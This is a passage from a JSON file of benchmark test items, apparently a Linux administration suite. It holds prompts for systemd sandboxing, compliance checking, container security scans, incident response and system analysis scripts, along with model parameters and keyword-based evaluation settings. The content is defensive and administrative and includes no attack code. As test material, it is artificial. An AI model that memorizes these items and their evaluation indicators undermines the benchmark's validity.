      "prompt": "\nWrite a systemd service unit file to run an application (`/usr/local/bin/unsafe_app`) in a secure sandbox:\n1. Use dynamic user (`DynamicUser=yes`) so it doesn't run as a persistent user.\n2. Prevent the process from gaining new privileges.\n3. Make the filesystem read-only except for a specific writable directory in `/var/lib/unsafe_app`.\n4. Blacklist kernel modules like `bluetooth` and `usb-storage` from being loaded by the service.\n5. Restrict network access to only allow outgoing TCP connections on port 443.\n6. Add comments explaining what each security directive does.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a systemd service unit file to run an application (`/usr/local/bin/unsafe_app`) in a secure sandbox:\n1. Use dynamic user (`DynamicUser=yes`) so it doesn't run as a persistent user.\n2. Prevent the process from gaining new privileges.\n3. Make the filesystem read-only except for a specific writable directory in `/var/lib/unsafe_app`.\n4. Blacklist kernel modules like `bluetooth` and `usb-storage` from being loaded by the service.\n5. Restrict network access to only allow outgoing TCP connections on port 443.\n6. Add comments explaining what each security directive does.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_20",
      "name": "Test 20: Graph-Based Service Dependency Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a Python script that models service dependencies as a directed graph:\n1. Read a service dependency config file (e.g., `A: B, C`).\n2. Build a graph representation (e.g., using the `networkx` library).\n3. Given a target service to start (e.g., 'A'), determine and print its entire dependency chain in the correct start order.\n4. Given a target service to stop (e.g., 'B'), determine and print all services that depend on it (the impact list).\n5. Detect and report any circular dependencies in the graph, printing the cycle path.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a Python script that models service dependencies as a directed graph:\n1. Read a service dependency config file (e.g., `A: B, C`).\n2. Build a graph representation (e.g., using the `networkx` library).\n3. Given a target service to start (e.g., 'A'), determine and print its entire dependency chain in the correct start order.\n4. Given a target service to stop (e.g., 'B'), determine and print all services that depend on it (the impact list).\n5. Detect and report any circular dependencies in the graph, printing the cycle path.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_21",
      "name": "Test 21: Intelligent Web Server Troubleshooter",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a troubleshooting script that diagnoses a web server issue:\n1. It takes a URL as an argument.\n2. It first checks local DNS resolution for the domain.\n3. It then simulates the request path:\n   - Checks connectivity to the local gateway.\n   - Checks connectivity to the resolved IP.\n   - Performs a full TLS handshake and validates the certificate chain using `openssl s_client`.\n   - Makes an HTTP GET request and checks the HTTP status code and response headers.\n4. Based on the point of failure, it should provide a specific hypothesis (e.g., \"Failure at DNS lookup suggests a resolver issue\" or \"Failure at TLS handshake with 'certificate expired' error suggests an SSL issue\").\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a troubleshooting script that diagnoses a web server issue:\n1. It takes a URL as an argument.\n2. It first checks local DNS resolution for the domain.\n3. It then simulates the request path:\n   - Checks connectivity to the local gateway.\n   - Checks connectivity to the resolved IP.\n   - Performs a full TLS handshake and validates the certificate chain using `openssl s_client`.\n   - Makes an HTTP GET request and checks the HTTP status code and response headers.\n4. Based on the point of failure, it should provide a specific hypothesis (e.g., \"Failure at DNS lookup suggests a resolver issue\" or \"Failure at TLS handshake with 'certificate expired' error suggests an SSL issue\").\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_22",
      "name": "Test 22: Compliance Checker with Auto-Remediation",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "verification",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a compliance script that checks system settings against a defined policy in a YAML file.\n- The YAML file defines checks, expected values, and remediation commands.\n- The script should:\n  1. Parse the policy file.\n  2. For each policy, check the current system state (e.g., check an sshd_config value, check a sysctl parameter).\n  3. Report if the system is compliant or non-compliant for that policy.\n  4. If a `--remediate` flag is passed, execute the defined remediation command for any non-compliant policies.\n- Provide an example policy YAML for checking that `PermitRootLogin` is `no` in `sshd_config`.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a compliance script that checks system settings against a defined policy in a YAML file.\n- The YAML file defines checks, expected values, and remediation commands.\n- The script should:\n  1. Parse the policy file.\n  2. For each policy, check the current system state (e.g., check an sshd_config value, check a sysctl parameter).\n  3. Report if the system is compliant or non-compliant for that policy.\n  4. If a `--remediate` flag is passed, execute the defined remediation command for any non-compliant policies.\n- Provide an example policy YAML for checking that `PermitRootLogin` is `no` in `sshd_config`.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "verification",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_23",
      "name": "Test 23: Dynamic Load Balancer Health Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a script that queries a load balancer's API (e.g., HAProxy's stats socket or Traefik's API) to perform a health analysis:\n1. Fetch the list of all backend servers and their current status ('UP', 'DOWN').\n2. For each 'UP' backend, check its current session count and request rate.\n3. Identify 'hotspots': any backend handling >50% more sessions than the average of its peers.\n4. Identify 'flapping': any backend that has changed state (UP to DOWN or vice-versa) more than 3 times in the last 10 minutes (requires storing state between runs).\n5. Generate a JSON report with overall health, and lists of any identified 'hotspot' or 'flapping' backends.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a script that queries a load balancer's API (e.g., HAProxy's stats socket or Traefik's API) to perform a health analysis:\n1. Fetch the list of all backend servers and their current status ('UP', 'DOWN').\n2. For each 'UP' backend, check its current session count and request rate.\n3. Identify 'hotspots': any backend handling >50% more sessions than the average of its peers.\n4. Identify 'flapping': any backend that has changed state (UP to DOWN or vice-versa) more than 3 times in the last 10 minutes (requires storing state between runs).\n5. Generate a JSON report with overall health, and lists of any identified 'hotspot' or 'flapping' backends.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_24",
      "name": "Test 24: Proactive Database Performance Tuning",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nWrite a PostgreSQL script that analyzes performance and generates tuning recommendations:\n1. Identify the top 5 most time-consuming queries from `pg_stat_statements`.\n2. For each of those queries, generate an `EXPLAIN (ANALYZE, BUFFERS)` plan.\n3. Analyze the query plans to detect common anti-patterns like sequential scans on large tables or nested loop joins with high row counts.\n4. Check for unused indexes and bloated tables (high percentage of dead tuples).\n5. Based on the findings, generate a report with specific, actionable recommendations, such as 'Recommendation: Create index on table `users` column `email`' or 'Recommendation: Run VACUUM FULL on table `events`'.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a PostgreSQL script that analyzes performance and generates tuning recommendations:\n1. Identify the top 5 most time-consuming queries from `pg_stat_statements`.\n2. For each of those queries, generate an `EXPLAIN (ANALYZE, BUFFERS)` plan.\n3. Analyze the query plans to detect common anti-patterns like sequential scans on large tables or nested loop joins with high row counts.\n4. Check for unused indexes and bloated tables (high percentage of dead tuples).\n5. Based on the findings, generate a report with specific, actionable recommendations, such as 'Recommendation: Create index on table `users` column `email`' or 'Recommendation: Run VACUUM FULL on table `events`'.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_25",
      "name": "Test 25: Runtime Container Security Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_containers",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux containers",
      "prompt": "\nCreate a container security script that analyzes running containers for runtime threats:\n1. For each running container, inspect its network namespace and identify any processes listening on `0.0.0.0`.\n2. Use `docker exec` to run a check inside each container for newly created executable files in `/tmp` or `/var/tmp`.\n3. Check the container's logs for anomalous patterns (e.g., repeated authentication failures, stack traces).\n4. Cross-reference the running container image against a vulnerability database using `trivy` or a similar tool.\n5. Generate a report prioritizing findings by container, with severity levels for each issue.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a container security script that analyzes running containers for runtime threats:\n1. For each running container, inspect its network namespace and identify any processes listening on `0.0.0.0`.\n2. Use `docker exec` to run a check inside each container for newly created executable files in `/tmp` or `/var/tmp`.\n3. Check the container's logs for anomalous patterns (e.g., repeated authentication failures, stack traces).\n4. Cross-reference the running container image against a vulnerability database using `trivy` or a similar tool.\n5. Generate a report prioritizing findings by container, with severity levels for each issue.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_26",
      "name": "Test 26: Canary Deployment Automation",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_automation",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux automation",
      "prompt": "\nWrite a deployment script for a 'canary release' strategy:\n1. It takes a new Docker image version as an argument.\n2. It first deploys the new version to a single 'canary' instance.\n3. It then runs a suite of integration tests against the canary instance.\n4. Simultaneously, it monitors key metrics from the canary (e.g., error rate, latency) for 5 minutes.\n5. If tests pass and metrics are stable, it proceeds to perform a rolling update of the main production pool with the new image.\n6. If any step fails, it automatically rolls back by destroying the canary instance and logging the failure.\nThe script should interact with a container orchestrator's API or CLI (e.g., `docker-compose`, `kubectl`).\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a deployment script for a 'canary release' strategy:\n1. It takes a new Docker image version as an argument.\n2. It first deploys the new version to a single 'canary' instance.\n3. It then runs a suite of integration tests against the canary instance.\n4. Simultaneously, it monitors key metrics from the canary (e.g., error rate, latency) for 5 minutes.\n5. If tests pass and metrics are stable, it proceeds to perform a rolling update of the main production pool with the new image.\n6. If any step fails, it automatically rolls back by destroying the canary instance and logging the failure.\nThe script should interact with a container orchestrator's API or CLI (e.g., `docker-compose`, `kubectl`).\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_27",
      "name": "Test 27: Ansible-Based System Hardening",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a modular Ansible playbook named `harden.yml` to enforce system security.\nThe playbook should be structured with roles:\n1. A role named `ssh` that ensures `PermitRootLogin` and `PasswordAuthentication` are set to `no`.\n2. A role named `firewall` that uses the `ufw` module to enable the firewall and allow only TCP traffic on ports 22, 80, and 443.\n3. A role named `kernel` that uses the `sysctl` module to set `net.ipv4.ip_forward` to 0 and `net.ipv4.conf.all.accept_redirects` to 0.\n4. The main `harden.yml` playbook should apply all three roles to a group of servers named `webservers`.\nInclude the necessary directory structure and example files for the roles.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a modular Ansible playbook named `harden.yml` to enforce system security.\nThe playbook should be structured with roles:\n1. A role named `ssh` that ensures `PermitRootLogin` and `PasswordAuthentication` are set to `no`.\n2. A role named `firewall` that uses the `ufw` module to enable the firewall and allow only TCP traffic on ports 22, 80, and 443.\n3. A role named `kernel` that uses the `sysctl` module to set `net.ipv4.ip_forward` to 0 and `net.ipv4.conf.all.accept_redirects` to 0.\n4. The main `harden.yml` playbook should apply all three roles to a group of servers named `webservers`.\nInclude the necessary directory structure and example files for the roles.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_28",
      "name": "Test 28: Multi-System Monitoring Integration",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "multi_hop",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nWrite a Python script that acts as a metric aggregator:\n1. It queries a Prometheus endpoint to get the current rate of `http_requests_total`.\n2. It connects to an InfluxDB database to get the latest `cpu_usage_idle` value.\n3. It runs a local shell command to check the number of active `sshd` processes.\n4. It combines these three disparate metrics into a single, cohesive JSON object.\n5. If any data source fails, the corresponding JSON value should be `null`, but the script should not crash.\n6. The final JSON object is pushed to a Slack webhook URL with a status summary.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a Python script that acts as a metric aggregator:\n1. It queries a Prometheus endpoint to get the current rate of `http_requests_total`.\n2. It connects to an InfluxDB database to get the latest `cpu_usage_idle` value.\n3. It runs a local shell command to check the number of active `sshd` processes.\n4. It combines these three disparate metrics into a single, cohesive JSON object.\n5. If any data source fails, the corresponding JSON value should be `null`, but the script should not crash.\n6. The final JSON object is pushed to a Slack webhook URL with a status summary.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "multi_hop",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_29",
      "name": "Test 29: Automated Incident Response Playbook",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate an automated incident response script that triggers when a specific alert is received (e.g., from a SIEM):\n1. The script is invoked with a suspicious IP address and a PID.\n2. It immediately captures a memory dump of the given PID using `gcore`.\n3. It isolates the suspicious IP by adding a rule to a network ACL or `iptables` to block all traffic.\n4. It gathers related evidence: active network connections from the PID, its open file handles (`lsof`), and its parent process tree.\n5. It archives all evidence and the memory dump into an encrypted zip file, with the password stored in a secure vault.\n6. It then attempts to gracefully terminate the process.\nThe script should be non-interactive and log every action with precise timestamps.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate an automated incident response script that triggers when a specific alert is received (e.g., from a SIEM):\n1. The script is invoked with a suspicious IP address and a PID.\n2. It immediately captures a memory dump of the given PID using `gcore`.\n3. It isolates the suspicious IP by adding a rule to a network ACL or `iptables` to block all traffic.\n4. It gathers related evidence: active network connections from the PID, its open file handles (`lsof`), and its parent process tree.\n5. It archives all evidence and the memory dump into an encrypted zip file, with the password stored in a secure vault.\n6. It then attempts to gracefully terminate the process.\nThe script should be non-interactive and log every action with precise timestamps.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_30",
      "name": "Test 30: Interactive Infrastructure CLI Report",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a terminal-based infrastructure report dashboard using a library like Python's `rich` or `blessed`.\n1. The dashboard should have multiple panels that update in near real-time (e.g., every 5 seconds).\n2. One panel should show overall service status (by pinging a list of hosts).\n3. A second panel should display a scrolling table of the top 5 processes by CPU and memory usage.\n4. A third panel should tail the last 10 lines of `/var/log/syslog`.\n5. The application should handle user input: pressing 'q' should quit gracefully.\nThe output should be visually organized and use colors to indicate status (e.g., green for 'UP', red for 'DOWN').\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a terminal-based infrastructure report dashboard using a library like Python's `rich` or `blessed`.\n1. The dashboard should have multiple panels that update in near real-time (e.g., every 5 seconds).\n2. One panel should show overall service status (by pinging a list of hosts).\n3. A second panel should display a scrolling table of the top 5 processes by CPU and memory usage.\n4. A third panel should tail the last 10 lines of `/var/log/syslog`.\n5. The application should handle user input: pressing 'q' should quit gracefully.\nThe output should be visually organized and use colors to indicate status (e.g., green for 'UP', red for 'DOWN').\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_31",
      "name": "Test 31: Kernel Module Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a script that analyzes loaded kernel modules and their dependencies:\n1. Parse /proc/modules to get all loaded modules with their memory usage, reference count, and dependencies\n2. For each module, use modinfo to extract: version, description, author, license, and parameters\n3. Identify modules that are loaded but have no dependent modules using them (ref count = 0)\n4. Check if any third-party modules (not in /lib/modules/$(uname -r)/kernel) are loaded\n5. Generate a graphviz dot file showing the module dependency tree with memory usage annotations\n6. Flag any modules that have tainted the kernel and decode the taint flags (P=proprietary, O=out-of-tree, etc.)\n7. Check for module signature verification status and report unsigned modules\nInclude proper parsing of kernel taint flags from /proc/sys/kernel/tainted.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a script that analyzes loaded kernel modules and their dependencies:\n1. Parse /proc/modules to get all loaded modules with their memory usage, reference count, and dependencies\n2. For each module, use modinfo to extract: version, description, author, license, and parameters\n3. Identify modules that are loaded but have no dependent modules using them (ref count = 0)\n4. Check if any third-party modules (not in /lib/modules/$(uname -r)/kernel) are loaded\n5. Generate a graphviz dot file showing the module dependency tree with memory usage annotations\n6. Flag any modules that have tainted the kernel and decode the taint flags (P=proprietary, O=out-of-tree, etc.)\n7. Check for module signature verification status and report unsigned modules\nInclude proper parsing of kernel taint flags from /proc/sys/kernel/tainted.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_32",
      "name": "Test 32: Memory Map Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a comprehensive process memory analyzer:\n1. Parse /proc/PID/maps to understand the memory layout of a given process\n2. Categorize memory regions: heap, stack, shared libraries, anonymous mappings, etc.\n3. For each shared library, check if ASLR is effective by comparing load addresses\n4. Identify potentially suspicious memory regions (RWX permissions, unusual paths)\n5. Calculate actual memory usage using /proc/PID/smaps including PSS (Proportional Set Size)\n6. Detect memory leaks by tracking anonymous memory growth over time\n7. Generate a visual representation of the memory layout with security annotations\n8. Check for common injection patterns (e.g., memory regions not backed by files)\nInclude detection of process hollowing and other memory-based attack indicators.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a comprehensive process memory analyzer:\n1. Parse /proc/PID/maps to understand the memory layout of a given process\n2. Categorize memory regions: heap, stack, shared libraries, anonymous mappings, etc.\n3. For each shared library, check if ASLR is effective by comparing load addresses\n4. Identify potentially suspicious memory regions (RWX permissions, unusual paths)\n5. Calculate actual memory usage using /proc/PID/smaps including PSS (Proportional Set Size)\n6. Detect memory leaks by tracking anonymous memory growth over time\n7. Generate a visual representation of the memory layout with security annotations\n8. Check for common injection patterns (e.g., memory regions not backed by files)\nInclude detection of process hollowing and other memory-based attack indicators.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_33",
      "name": "Test 33: Syscall Tracing and Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a syscall analysis tool using ptrace:\n1. Attach to a running process and trace all system calls\n2. Categorize syscalls by type: file I/O, network, process management, memory, etc.\n3. Track file descriptors throughout their lifecycle (open->read/write->close)\n4. Detect suspicious patterns: excessive failed syscalls, privilege escalation attempts\n5. Build a syscall frequency histogram and identify anomalies\n6. Track time spent in each syscall and identify performance bottlenecks\n7. Generate a timeline of security-relevant events (file access, network connections, exec calls)\n8. Implement syscall filtering to reduce noise (e.g., ignore certain common syscalls)\nOutput both a detailed log and a summary report with security and performance insights.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a syscall analysis tool using ptrace:\n1. Attach to a running process and trace all system calls\n2. Categorize syscalls by type: file I/O, network, process management, memory, etc.\n3. Track file descriptors throughout their lifecycle (open->read/write->close)\n4. Detect suspicious patterns: excessive failed syscalls, privilege escalation attempts\n5. Build a syscall frequency histogram and identify anomalies\n6. Track time spent in each syscall and identify performance bottlenecks\n7. Generate a timeline of security-relevant events (file access, network connections, exec calls)\n8. Implement syscall filtering to reduce noise (e.g., ignore certain common syscalls)\nOutput both a detailed log and a summary report with security and performance insights.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_34",
      "name": "Test 34: CPU Performance Counter Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a script using perf_event_open to access CPU performance counters:\n1. Set up performance counters for: cache misses, branch mispredictions, CPU cycles, instructions\n2. Monitor these counters for a target process or system-wide\n3. Calculate derived metrics: IPC (instructions per cycle), cache hit rate, branch prediction accuracy\n4. Detect performance anomalies that might indicate security issues (e.g., cache side-channel attacks)\n5. Track context switches and their impact on cache performance\n6. Monitor CPU frequency scaling and thermal throttling events\n7. Correlate performance degradation with system events (I/O, interrupts)\n8. Generate alerts for abnormal performance patterns that could indicate crypto-mining or DoS\nInclude proper handling of counter overflow and multiplexing.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a script using perf_event_open to access CPU performance counters:\n1. Set up performance counters for: cache misses, branch mispredictions, CPU cycles, instructions\n2. Monitor these counters for a target process or system-wide\n3. Calculate derived metrics: IPC (instructions per cycle), cache hit rate, branch prediction accuracy\n4. Detect performance anomalies that might indicate security issues (e.g., cache side-channel attacks)\n5. Track context switches and their impact on cache performance\n6. Monitor CPU frequency scaling and thermal throttling events\n7. Correlate performance degradation with system events (I/O, interrupts)\n8. Generate alerts for abnormal performance patterns that could indicate crypto-mining or DoS\nInclude proper handling of counter overflow and multiplexing.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_35",
      "name": "Test 35: Block Device I/O Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a comprehensive block device I/O analyzer:\n1. Parse /sys/block/*/stat to get detailed I/O statistics for all block devices\n2. Calculate IOPS, throughput, average request size, and queue depth\n3. Monitor I/O latency using /proc/diskstats and identify slow devices\n4. Track I/O patterns: sequential vs random, read vs write ratios\n5. Use blktrace to capture detailed I/O traces and analyze request merging efficiency\n6. Identify processes generating the most I/O using /proc/PID/io\n7. Detect I/O storms and correlate with system events\n8. Monitor device mapper statistics for LVM/RAID performance\n9. Check for I/O errors and failing devices in kernel logs\nGenerate both real-time metrics and historical analysis with anomaly detection.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a comprehensive block device I/O analyzer:\n1. Parse /sys/block/*/stat to get detailed I/O statistics for all block devices\n2. Calculate IOPS, throughput, average request size, and queue depth\n3. Monitor I/O latency using /proc/diskstats and identify slow devices\n4. Track I/O patterns: sequential vs random, read vs write ratios\n5. Use blktrace to capture detailed I/O traces and analyze request merging efficiency\n6. Identify processes generating the most I/O using /proc/PID/io\n7. Detect I/O storms and correlate with system events\n8. Monitor device mapper statistics for LVM/RAID performance\n9. Check for I/O errors and failing devices in kernel logs\nGenerate both real-time metrics and historical analysis with anomaly detection.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
